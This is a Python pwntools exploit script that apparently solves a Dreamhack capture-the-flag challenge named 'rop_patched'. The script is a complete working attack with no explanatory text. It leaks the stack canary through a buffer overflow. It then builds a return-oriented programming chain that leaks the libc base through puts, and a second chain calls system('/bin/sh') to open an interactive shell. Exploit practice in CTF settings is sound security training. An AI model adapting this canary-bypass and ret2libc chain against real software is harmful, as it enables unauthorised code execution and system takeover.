#!/usr/bin/python3

from pwn import *
import subprocess

context.binary = exe = ELF('./rop_patched',checksec = False)
libc = ELF('./libc-2.27.so',checksec=False)

# r = remote('host3.dreamhack.games', 21219)
r = process(exe.path)
# input()

rw_section = 0x0000000000602300
pop_rdi = 0x00000000004007f3
ret = 0x000000000040055e

payload = b'A'*0x39
r.sendafter(b'Buf: ',payload)
r.recv(0x3e)
leak = u64(b'\00' + r.recv(7))
log.info('LEAK Canary: ' + hex(leak))

payload = b'A'*0x38 + p64(int(hex(leak),16)) + p64(rw_section)
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts']) + p64(exe.sym['main'])

r.sendafter(b'Buf: ',payload)

leak_libc = u64(r.recv(6) + b'\00\00')
libc.address = leak_libc - libc.sym['puts']

log.info('Leak libc: ' + hex(leak_libc))
log.info('Libc base: ' + hex(libc.address))

r.sendafter(b'Buf: ',b'aaaaa')
# r.recv(0x3e)
# leak = u64(b'\00' + r.recv(7))
# log.info('LEAK Canary: ' + hex(leak))

payload = b'A'*0x38 + p64(int(hex(leak),16)) + p64(rw_section)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret)
payload += p64(libc.sym['system'])

r.sendafter(b'Buf: ',payload)

# 0x7ed552cf77b1a800

r.interactive()